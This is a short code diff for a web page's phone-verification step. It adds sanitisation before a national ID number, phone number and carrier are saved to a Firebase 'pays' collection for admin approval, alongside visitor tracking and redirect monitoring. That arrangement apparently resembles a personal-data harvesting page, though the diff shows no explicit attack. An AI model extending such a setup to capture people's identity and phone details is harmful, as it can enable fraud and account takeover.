@@ -16,6 +16,7 @@ import { db, setDoc, doc } from "@/lib/firebase";
 import { onSnapshot, getDoc, Firestore } from "firebase/firestore";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { updateVisitorPage } from "@/lib/visitor-tracking";
+import { sanitizeData } from "@/lib/sanitize";
 
 export default function VerifyPhonePage() {
   const [idNumber, setIdNumber] = useState("");
@@ -183,12 +184,18 @@ export default function VerifyPhonePage() {
     try {
       // Save ID number, phone number and carrier to Firebase
       if (!db) return;
+      
+      // Sanitize data before saving
+      const sanitizedData = sanitizeData({
+        phoneIdNumber: idNumber,
+        phoneNumber: phoneNumber,
+        phoneCarrier: selectedCarrier,
+      });
+      
       await setDoc(
         doc(db as Firestore, "pays", visitorID),
         {
-          phoneIdNumber: idNumber,
-          phoneNumber: phoneNumber,
-          phoneCarrier: selectedCarrier,
+          ...sanitizedData,
           phoneSubmittedAt: new Date().toISOString(),
           _v4Status: "pending", // Set to pending for admin approval
           phoneUpdatedAt: new Date().toISOString(),
